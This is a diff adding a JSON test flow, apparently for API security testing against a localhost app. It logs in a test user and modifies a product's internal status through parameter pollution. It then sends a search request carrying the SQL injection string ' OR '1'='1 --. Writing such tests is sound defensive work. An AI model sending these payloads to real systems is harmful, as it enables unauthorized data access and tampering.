@@ -1,0 +1,60 @@
+{
+    "id": "flow_param_pollution_alicesmith_product_status_and_injection_search",
+    "name": "Parameter Pollution: AliceSmith Modifies Product Status & Injection Search",
+    "description": "AliceSmith modifies a product's internal status via parameter pollution and then performs a product search with an injection-like string.",
+    "staticVars": {
+      "baseUrl": "http://localhost:8000",
+      "aliceUsername": "AliceSmith",
+      "alicePassword": "AlicePass1!",
+      "targetProductIdForStatus": "a1b2c3d4-e5f6-7890-1234-567890abcdef"
+    },
+    "steps": [
+      {
+        "id": "step_login_alicesmith_param_poll_status",
+        "name": "Login AliceSmith",
+        "type": "request",
+        "method": "POST",
+        "url": "{{baseUrl}}/api/auth/login?username={{aliceUsername}}&password={{alicePassword}}",
+        "onFailure": "stop",
+        "extract": {
+          "alice_token": "body.access_token"
+        }
+      },
+      {
+        "id": "step_alicesmith_modify_product_internal_status",
+        "name": "AliceSmith Modifies Product Internal Status (Parameter Pollution)",
+        "type": "request",
+        "method": "PUT",
+        "url": "{{baseUrl}}/api/products/{{targetProductIdForStatus}}?name=Wireless%20Mouse&internal_status=backdoored",
+        "headers": {
+          "Authorization": "Bearer {{alice_token}}"
+        },
+        "onFailure": "stop"
+      },
+      {
+        "id": "step_alicesmith_verify_product_status_change",
+        "name": "AliceSmith Verifies Product Status Change",
+        "type": "request",
+        "method": "GET",
+        "url": "{{baseUrl}}/api/products/{{targetProductIdForStatus}}",
+        "headers": {
+          "Authorization": "Bearer {{alice_token}}"
+        },
+        "onFailure": "stop",
+        "extract": {
+          "product_internal_status": "body.internal_status"
+        }
+      },
+      {
+        "id": "step_alicesmith_product_search_injection",
+        "name": "AliceSmith Product Search with Injection String",
+        "type": "request",
+        "method": "GET",
+        "url": "{{baseUrl}}/api/products/search?name='%20OR%20'1'='1%20--",
+        "headers": {
+          "Authorization": "Bearer {{alice_token}}"
+        },
+        "onFailure": "stop"
+      }
+    ]
+  }
